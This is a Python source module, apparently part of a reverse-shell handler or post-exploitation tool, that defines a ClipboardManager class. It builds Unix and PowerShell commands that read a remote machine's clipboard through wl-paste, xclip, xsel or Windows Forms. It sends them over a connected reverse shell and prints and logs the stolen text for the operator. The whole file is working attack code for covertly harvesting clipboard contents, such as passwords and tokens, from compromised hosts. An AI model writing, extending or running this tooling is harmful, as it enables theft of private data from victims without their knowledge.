"""Remote clipboard read for connected sessions."""

import json

from .constants import CLIP_MARK_END, CLIP_MARK_START


class ClipboardManager:
    """Platform-aware clipboard read over the shell channel."""

    def __init__(self, handler):
        self.h = handler

    def _extract_clipboard(self, output):
        output = self.h._strip_ansi(output)
        start = output.rfind(CLIP_MARK_START)
        if start == -1:
            return None, output.strip()
        end = output.find(CLIP_MARK_END, start + len(CLIP_MARK_START))
        if end == -1:
            return None, output.strip()
        payload = output[start + len(CLIP_MARK_START):end]
        try:
            data = json.loads(payload)
            if isinstance(data, dict):
                return data, output[end + len(CLIP_MARK_END):].strip()
        except json.JSONDecodeError:
            pass
        return {'text': payload, 'ok': True, 'tool': 'raw'}, output[end + len(CLIP_MARK_END):].strip()

    def _log_clipboard(self, client_sock, success, detail=''):
        logger = self.h._get_session_logger(client_sock)
        if logger:
            logger.log_clipboard('read', success, detail)

    def _unix_get_cmd(self):
        mark_s = CLIP_MARK_START
        mark_e = CLIP_MARK_END
        source = f"""
import json, os, subprocess, sys
result = {{'ok': False, 'text': '', 'tool': '', 'error': ''}}
commands = [
    (['wl-paste', '--no-newline'], 'wl-paste'),
    (['wl-paste'], 'wl-paste'),
    (['xclip', '-o', '-selection', 'clipboard'], 'xclip'),
    (['xsel', '-p', '-b'], 'xsel'),
    (['xsel', '--clipboard', '--output'], 'xsel'),
]
for cmd, name in commands:
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=3)
        result['ok'] = True
        result['text'] = out.decode('utf-8', errors='replace')
        result['tool'] = name
        break
    except Exception:
        continue
if not result['ok']:
    if not os.environ.get('DISPLAY') and not os.environ.get('WAYLAND_DISPLAY'):
        result['error'] = 'No graphical session detected (headless)'
    else:
        result['error'] = 'No clipboard utility available (install wl-clipboard, xclip, or xsel)'
print({json.dumps(mark_s)} + json.dumps(result) + {json.dumps(mark_e)}, end='')
"""
        return (
            f"python3 -c {json.dumps(source)} 2>/dev/null || "
            f"python -c {json.dumps(source)} 2>/dev/null || "
            f"(T=''; "
            f"command -v wl-paste >/dev/null 2>&1 && T=$(wl-paste 2>/dev/null); "
            f"[ -z \"$T\" ] && command -v xclip >/dev/null 2>&1 && T=$(xclip -o -selection clipboard 2>/dev/null); "
            f"[ -z \"$T\" ] && command -v xsel >/dev/null 2>&1 && T=$(xsel -p -b 2>/dev/null); "
            f"printf '%s' '{mark_s}'; "
            f"if [ -n \"$T\" ]; then printf '{{\"ok\":true,\"text\":\"%s\",\"tool\":\"shell\"}}' \"$(printf '%s' \"$T\" | sed 's/\\\\/\\\\\\\\/g; s/\"/\\\\\"/g')\"; "
            f"else printf '{{\"ok\":false,\"text\":\"\",\"error\":\"clipboard unavailable\"}}'; fi; "
            f"printf '%s' '{mark_e}')"
        )

    def _win_get_ps(self):
        mark_s = CLIP_MARK_START
        mark_e = CLIP_MARK_END
        return f"""
$result = @{{ ok = $false; text = ''; tool = 'powershell'; error = '' }}
try {{
  Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
  $text = [System.Windows.Forms.Clipboard]::GetText()
  if ($null -ne $text) {{
    $result.ok = $true
    $result.text = $text
  }} else {{
    $result.error = 'Clipboard empty or non-text content'
  }}
}} catch {{
  try {{
    $text = Get-Clipboard -Format Text -ErrorAction Stop
    if ($text) {{ $result.ok = $true; $result.text = $text }} else {{ $result.error = 'Clipboard empty' }}
  }} catch {{
    $result.error = $_.Exception.Message
  }}
}}
'{mark_s}' + ($result | ConvertTo-Json -Compress) + '{mark_e}'
"""

    def get(self, client_sock):
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
            return False
        shell_type = info.get('type', 'unknown')
        self.h._flush_shell(client_sock)
        if shell_type == 'windows':
            cmd = self.h._win_ps_cmd(self._win_get_ps())
        else:
            cmd = self._unix_get_cmd()
        if not self.h.send_to_revshell(client_sock, cmd):
            return False
        output = self.h.recv_output(client_sock, timeout=15.0, until_marker=CLIP_MARK_END)
        data, _ = self._extract_clipboard(output)
        if not data or not data.get('ok'):
            error = (data or {}).get('error', 'clipboard read failed')
            print(f"{self.h.colors['red']}Clipboard read failed: {error}{self.h.colors['end']}")
            self._log_clipboard(client_sock, False, error)
            return False
        tool = data.get('tool', 'unknown')
        text = data.get('text', '')
        preview = text if len(text) <= 200 else text[:200] + '...'
        print(f"{self.h.colors['green']}Clipboard ({tool}):{self.h.colors['end']}\n{preview}")
        if len(text) > 200:
            print(f"{self.h.colors['cyan']}({len(text)} characters total){self.h.colors['end']}")
        self._log_clipboard(client_sock, True, f"tool={tool}, length={len(text)}")
        return True

    def handle_command(self, client_sock, cmd_parts, from_client=False):
        if not cmd_parts or cmd_parts[0].lower() != 'clipboard':
            return False
        if len(cmd_parts) > 1:
            print(f"{self.h.colors['red']}Usage: clipboard{self.h.colors['end']}")
            return True
        self.get(client_sock)
        return True
